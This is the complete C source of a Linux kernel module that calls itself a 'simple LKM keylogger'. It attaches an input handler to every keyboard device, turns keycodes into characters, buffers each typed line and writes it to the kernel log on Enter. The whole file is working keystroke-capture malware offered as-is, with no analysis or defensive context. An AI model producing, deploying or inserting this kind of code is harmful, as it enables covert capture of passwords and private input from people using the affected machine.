#include <linux/module.h>
#include <linux/init.h>
#include <linux/input.h>
#include <linux/kernel.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("slayer");
MODULE_DESCRIPTION("simple LKM keylogger ;)");
MODULE_VERSION("1.0");

#define BUF_SIZE 128

static char key_buffer[BUF_SIZE];
static int buf_pos = 0;

static const char *keycode_to_str(unsigned int code) {
    //apenas as teclas mais comuns!
    switch (code) {
        case 2: return "1";
        case 3: return "2";
        case 4: return "3";
        case 5: return "4";
        case 6: return "5";
        case 7: return "6";
        case 8: return "7";
        case 9: return "8";
        case 10: return "9";
        case 11: return "0";
        case 12: return "-";
        case 13: return "=";
        case 14: return "BACKSPACE";
        case 15: return "TAB";
        case 16: return "q";
        case 17: return "w";
        case 18: return "e";
        case 19: return "r";
        case 20: return "t";
        case 21: return "y";
        case 22: return "u";
        case 23: return "i";
        case 24: return "o";
        case 25: return "p";
        case 28: return "ENTER";
        case 30: return "a";
        case 31: return "s";
        case 32: return "d";
        case 33: return "f";
        case 34: return "g";
        case 35: return "h";
        case 36: return "j";
        case 37: return "k";
        case 38: return "l";
        case 39: return ";";
        case 40: return "'";
        case 41: return "`";
        case 42: return "SHIFT";
        case 43: return "\\";
        case 44: return "z";
        case 45: return "x";
        case 46: return "c";
        case 47: return "v";
        case 48: return "b";
        case 49: return "n";
        case 50: return "m";
        case 51: return ",";
        case 52: return ".";
        case 53: return "/";
        case 57: return "SPACE";
        default: return NULL;
    }
}

static bool is_printable_key(unsigned int code) {
    return keycode_to_str(code) != NULL &&
           strcmp(keycode_to_str(code), "BACKSPACE") != 0 &&
           strcmp(keycode_to_str(code), "ENTER") != 0 &&
           strcmp(keycode_to_str(code), "SHIFT") != 0 &&
           strcmp(keycode_to_str(code), "TAB") != 0;
}

static bool keylogger_filter(struct input_handle *handle, unsigned int type, unsigned int code, int value) {
    const char *key_str;

    if (type != EV_KEY || value != 1)
        return false;

    key_str = keycode_to_str(code);
    if (!key_str)
        return false;

    if (strcmp(key_str, "BACKSPACE") == 0) {
        if (buf_pos > 0) {
            buf_pos--;
            key_buffer[buf_pos] = '\0';
        }
    } else if (strcmp(key_str, "ENTER") == 0) {
        if (buf_pos > 0) {
            printk(KERN_INFO "FUCK12 - KEYLOGGER: %s\n", key_buffer);
            buf_pos = 0;
            key_buffer[0] = '\0';
        }
    } else if (is_printable_key(code)) {
        if (buf_pos < BUF_SIZE - 1) {
            key_buffer[buf_pos++] = key_str[0];
            key_buffer[buf_pos] = '\0';
        }
    }

    return false;
}

static struct input_handle *keylogger_handle;

static bool is_keyboard(struct input_dev *dev) {
    return test_bit(EV_KEY, dev->evbit);
}

static int keylogger_connect(struct input_handler *handler, struct input_dev *dev, const struct input_device_id *id) {
    struct input_handle *handle;
    int error;

    if (!is_keyboard(dev))
        return -ENODEV;

    handle = kzalloc(sizeof(struct input_handle), GFP_KERNEL);
    if (!handle)
        return -ENOMEM;

    handle->dev = dev;
    handle->handler = handler;
    handle->name = "keylogger_handle";

    error = input_register_handle(handle);
    if (error) {
        kfree(handle);
        return error;
    }

    error = input_open_device(handle);
    if (error) {
        input_unregister_handle(handle);
        kfree(handle);
        return error;
    }

    keylogger_handle = handle;
    printk(KERN_INFO "FUCK12 KEYLOGGER CONNECTED -> %s\n", dev_name(&dev->dev));
    return 0;
}

static void keylogger_disconnect(struct input_handle *handle) {
    input_close_device(handle);
    input_unregister_handle(handle);
    kfree(handle);
    printk(KERN_INFO "FUCK12 KEYLOGGER DISCONNECTED\n");
}

static const struct input_device_id keylogger_ids[] = {
    { .driver_info = 1 },
    { },
};

static struct input_handler keylogger_handler = {
    .filter = keylogger_filter,
    .connect = keylogger_connect,
    .disconnect = keylogger_disconnect,
    .name = "keylogger_handler",
    .id_table = keylogger_ids,
};

static int __init keylogger_init(void) {
    printk(KERN_INFO "FUCK12 LOADED!\n");
    return input_register_handler(&keylogger_handler);
}

static void __exit keylogger_exit(void) {
    input_unregister_handler(&keylogger_handler);
    printk(KERN_INFO "FUCK12 UNLOADED!\n");
}

module_init(keylogger_init);
module_exit(keylogger_exit);
